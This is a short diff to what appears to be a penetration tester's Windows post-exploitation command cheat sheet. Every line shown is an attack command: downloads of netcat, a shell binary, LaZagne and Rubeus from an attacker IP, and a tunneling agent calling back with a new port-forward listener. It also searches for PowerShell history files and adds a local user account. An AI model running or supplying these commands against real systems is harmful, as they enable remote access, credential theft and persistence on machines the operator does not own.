@@ -4,6 +4,8 @@ curl.exe http://192.168.45.224/nc.exe -o nc.exe
 
 curl.exe http://192.168.45.224/agent.exe -o agent.exe
 .\agent.exe -connect 192.168.45.224:11601 -ignore-cert
+listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
+
 
 curl.exe http://192.168.45.224/shell.exe -o \users\public\shell.exe 
 
@@ -30,7 +32,7 @@ curl.exe http://192.168.45.224:8000/lazagne.exe -o lazagne.exe
 
 curl.exe http://192.168.45.224/Rubeus.exe -o rubeus.exe
 
-cmd /r dir /s /b ConsoleHost_history.txt
+cmd /c dir /s /b ConsoleHost_history.txt
 
 
 net user JohnDoe SecureP@ssw0rd /add
